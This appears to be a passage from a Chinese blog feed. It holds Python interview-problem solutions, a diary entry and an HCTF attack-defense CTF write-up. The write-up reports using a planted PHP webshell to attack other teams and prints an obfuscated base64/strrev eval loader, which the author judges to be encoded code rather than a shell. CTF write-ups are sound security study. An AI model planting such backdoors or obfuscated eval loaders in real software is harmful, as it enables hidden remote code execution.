class="built_in">sorted</span>(lst)</span><br><span class="line">    mean_all = mean(sorted_list)</span><br><span class="line">    <span class="comment"># 去除一个极端值然后依据平均数来移动</span></span><br><span class="line">    mean_without_last = mean(sorted_list[:-<span class="number">1</span>])</span><br><span class="line">    mean_without_first = mean(sorted_list[<span class="number">1</span>:])</span><br><span class="line">    <span class="comment"># 对平均数影响越大说明越极端</span></span><br><span class="line">    <span class="comment"># 去除最大值更好</span></span><br><span class="line">    <span class="keyword">if</span> mean_all - mean_without_last &gt; mean_without_first - mean_all:</span><br><span class="line">        <span class="comment"># 向上取整还是向下取整取决于两边元素的数量,最终取min就行</span></span><br><span class="line">        target_floor = <span class="built_in">int</span>(mean_without_last)</span><br><span class="line">        target_ceil = target_floor + <span class="number">1</span></span><br><span class="line">        res_floor = <span class="number">0</span></span><br><span class="line">        res_ceil = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> sorted_list[:-<span class="number">1</span>]:</span><br><span class="line">            res_floor += <span class="built_in">abs</span>(target_floor - i)</span><br><span class="line">            res_ceil += <span class="built_in">abs</span>(target_ceil - i)</span><br><span class="line">    <span class="comment"># 去除最小值更好</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        target_floor = <span class="built_in">int</span>(mean_without_first)</span><br><span class="line">        target_ceil = target_floor + <span class="number">1</span></span><br><span class="line">        res_floor = <span class="number">0</span></span><br><span class="line">        res_ceil = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> sorted_list[<span class="number">1</span>:]:</span><br><span class="line">            res_floor += <span class="built_in">abs</span>(target_floor - i)</span><br><span class="line">            res_ceil += <span class="built_in">abs</span>(target_ceil - i)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">min</span>(res_ceil, res_floor)</span><br><span class="line"><span class="comment"># print(good_list([2,2,2,2,2,4,4,4,4,8,8,8,8,8,888]))</span></span><br><span class="line"><span class="comment"># output : 30</span></span><br><span class="line"><span class="comment"># to 2: 4 * 2 + 5 * 6 = 38</span></span><br><span class="line"><span class="comment"># to 4: 5 * 2 + 5 * 4 = 30</span></span><br><span class="line"><span class="comment"># to 8: 5 * 6 + 4 * 4 = 46</span></span><br></pre></td></tr></table></figure><h2 id="最大连续子串权重">最大连续子串权重</h2><p>具体记不太清了,描述有点长. 首先定义连续子串权重: 比如11000111 11, 000, 111分别是三个最大连续子串,则记权重为3</p><p>然后要求输出一个字符串的所有子串的最大连续子串权重. 比如1101 1元素:1, 1, 0, 1. 共计4</p><p>2元素:11, 10, 01. 11记1, 10记2, 01记2</p><p>3元素:110, 101. 110记2, 101记3</p><p>4元素:1101. 记3</p><p>所以总权重为4+1+2+2+2+3+3 = 17,输出17</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 最大连续子串权重</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">weight</span>(<span class="params">s</span>):</span><br><span class="line">    left = <span class="number">0</span></span><br><span class="line">    right = <span class="number">0</span></span><br><span class="line">    length = <span class="built_in">len</span>(s)</span><br><span class="line">    ret = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> right &lt; length:</span><br><span class="line">        <span class="keyword">if</span> s[left] == s[right]:</span><br><span class="line">            right += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = right</span><br><span class="line">            ret += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> ret + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_substring</span>(<span class="params">s</span>):</span><br><span class="line">    s_weight = <span class="number">0</span></span><br><span class="line">    lens = <span class="built_in">len</span>(s)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, lens + <span class="number">1</span>):</span><br><span class="line">        left = <span class="number">0</span></span><br><span class="line">        right = i</span><br><span class="line">        <span class="keyword">while</span> right &lt;= lens:</span><br><span class="line">            <span class="comment"># ret_lst = []</span></span><br><span class="line">            <span class="comment"># ret_lst.append(s[left:right])</span></span><br><span class="line">            s_weight += weight(s[left:right])</span><br><span class="line">            left += <span class="number">1</span></span><br><span class="line">            right += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s_weight</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(weight(&#x27;11000111&#x27;))</span></span><br><span class="line"><span class="comment"># should be 3</span></span><br><span class="line"><span class="comment"># 11, 000, 111</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(get_substring(&#x27;1101&#x27;))</span></span><br><span class="line"><span class="comment"># should be 17</span></span><br></pre></td></tr></table></figure><p>不过最后TLE了,应该还能优化,比如<code>get_substring</code>带一个字典,每算出一个weight先查询,没有的话再计算然后更新,空间换时间. 不过当时没反应过来.</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>大四</title>
      <link href="/2019/08/31/%E5%A4%A7%E5%9B%9B/"/>
      <url>/2019/08/31/%E5%A4%A7%E5%9B%9B/</url>
      
        <content type="html"><![CDATA[<p>博客放了蛮久一段时间了,前一段时间又是考试又是雅思的并没有多少时间。不过近期雅思终于也算考过了,相对来说有那么一些空闲时间了,比赛可能的话也可以跟着看一看了,不过肯定得建立在申请没什么大问题的基础上了. 申请问题主要是GRE和APS两个部分 GRE主要是NUS那边需要,目前看来GRE的词汇我还确实不太足,这一部分需要慢慢补,加上NUS申请期快截至了,如果准备GRE的话那大概就只能春季申请了,不过缺点就是那个时候可能面临大批研后出国的人一起,竞争压力大. 而APS则是德国那边需要,专业匹配度我倒是不那么担心,不过因为APS审核时间不确定,一般需要三个月时间来准备。复习、翻译、面试准备的时间其实并不充裕,专有名词解释翻译,数学的复习之类的实际上也需要大量时间。 至于面试资料填写推荐信什么的也是得弄好这些必须要求之后再去考虑的,不管怎么说,走一步看一步吧,后续有事情再继续更新吧.</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hctf线下</title>
      <link href="/2018/12/19/hctf%E7%BA%BF%E4%B8%8B/"/>
      <url>/2018/12/19/hctf%E7%BA%BF%E4%B8%8B/</url>
      
        <content type="html"><![CDATA[<p>第一次打线下,虽然提前准备了一些东西,但还是太菜了,简单记录一下吧</p><h1 id="第一天的题">第一天的题</h1><h2 id="预留后门">预留后门</h2><p>拿到ssh之后连上去打包一份<code>www.tar.gz</code>让队友下下来d盾扫了一下 发现/workdir/config/emmm_version.php里面存在一句话 删掉一句话并写打全场脚本,虽然很多队删掉了,但是还有可以拿一些队的分数</p><h2 id="分析后门其实不是">分析后门(其实不是</h2><p>除了前面说到的后门,d盾还扫出来一些奇奇怪怪的东西 比如client/manage/emmm_userwebzz.php <a href="/images/2018/12/2018-12-17-15-21-33-创建的截图.png"><img src="/images/2018/12/2018-12-17-15-21-33-创建的截图.png" /></a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$OOOOOOO0</span> = <span class="string">&quot;\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65&quot;</span>;</span><br><span class="line"><span class="variable">$OOOOO0OO</span> = <span class="string">&quot;=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&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$OOOOOOO0</span>(<span class="string">&quot;aWYoIWlzc2V0KCRveW9fbG9ja2luZykpew0KJGtleT1maWxlX2dldF9jb250ZW50cygkRW5jb2RldXJsLiJmdW5jdGlvbi9mb250LzhiYTRjM2M1ZGJkZmNmOWMyZDcyNmZlMTFmMWZhOGQ2LnR4dCIpOw0KJGtleT10cmltKCRrZXkpOw0KaWYoJGtleSE9IjhiYTRjM2M1ZGJkZmNmOWMyZDcyNmZlMTFmMWZhOGQ2Iil7DQpkaWUoIjxhIHN0eWxlPVwiY29sb3I6cmVkO2ZvbnQtc2l6ZToxNHB4XCI+6ZSZ6K+v77ya5a+G5YyZ56C05Z2PPC9hPiIpOw0KfQ0KJG95b19sb2NraW5nPSJwYXNzZWQiOw0KfQ0KZXZhbCgkT09PT09PTzAoc3RycmV2KCRPT09PTzBPTykpKTsNCg==&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看起来似乎像是shell,但其实不是,只不过是一些代码的变化而已 把eval解一下就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$OOOOOOO0</span> = <span class="string">&quot;base64_decode&quot;</span>;</span><br><span class="line"><span class="variable">$OOOOO0OO</span> = <span class="string">&quot;=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